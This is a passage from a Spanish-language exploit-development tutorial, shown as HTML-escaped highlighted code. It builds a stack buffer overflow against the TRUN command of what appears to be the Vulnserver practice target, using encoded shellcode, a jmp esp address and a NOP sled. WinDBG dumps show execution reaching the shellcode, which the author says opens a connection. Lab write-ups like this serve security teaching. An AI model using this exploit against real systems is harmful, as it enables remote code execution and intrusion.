z-hex z-python&quot;&gt;\xdd&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6b&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x85&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x50&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x59&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x59&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x07&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x37&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x89&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf9&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x63&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf6&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xae&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x53&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x63&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x75&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x90&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc8&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x15&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x99&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x21&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa5&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x63&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa6&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x21&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x64&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xdf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xd1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8b&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb7&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x16&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x8c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xc3&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xa2&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf6&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2f&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x3e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xe0&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xac&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xca&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x99&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xf4&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xac&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xbf&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x9c&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xb1&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x6a&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x2c&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xed&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xaa&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x1e&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x52&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x42&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\xca&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x0a&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 0x396f4338 = 2006
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x41&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2006&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; junk
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p32&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-hexadecimal z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-numeric z-base z-python&quot;&gt;0x&lt;&#x2F;span&gt;625011bb&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; eip -&amp;gt; jmp esp
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x90&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;10&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;shellcode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-augmented z-python&quot;&gt;+=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-constant z-character z-escape z-hex z-python&quot;&gt;\x90&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;*&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-group z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2100&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;-&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;len&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; filler
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-string z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TRUN .&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;payload&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;p&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-accessor z-dot z-python&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;send&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;buf&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;EL siguiente volcado de WinDBG muestra los nops y justo detrás el shellcode&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00fbf1e8 ebx=000000d8 ecx=00db50fc edx=0000000a esi=00401848 edi=00401848
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=625011bb esp=00fbf9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;essfunc!EssentialFunc3+0x3:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;625011bb ffe4            jmp     esp {00fbf9c8}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:003&amp;gt; dd esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00fbf9c8  90909090 90909090 13ba9090 dd1095a8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00fbf9d8  2474d9c0 c92958f4 c08352b1 0e503104
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00fbf9e8  77a64303 f55e9fe5 9a9f5f06 9aaeba8f
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00fbf9f8  2a81cff4 c02d9d7e a4a535d2 020e3afa
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00fbfa08  3f8f75dd 4213141d 8d2af672 f06bf787
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00fbfa18  7e24a56a ca4059d8 da1ad2e1 ddea0761
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00fbfa28  84609640 bca41942 f9a901ca 7519ba85
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00fbfa38  76506a14 855c53bb 765b94c5 0b9fecb0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Como podemos ver en el siguiente volcado si pasamos por encima los nops, se ejecutará nuestro shellcode y se establecerá una conexión.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:002&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00a2f1e8 ebx=00000118 ecx=00df72ec edx=0000000a esi=00401848 edi=00401848
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00a2f9c8 esp=00a2f9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9c8 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:002&amp;gt; u @eip l15
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9c8 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9c9 90              nop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00a2f9ca 90              nop
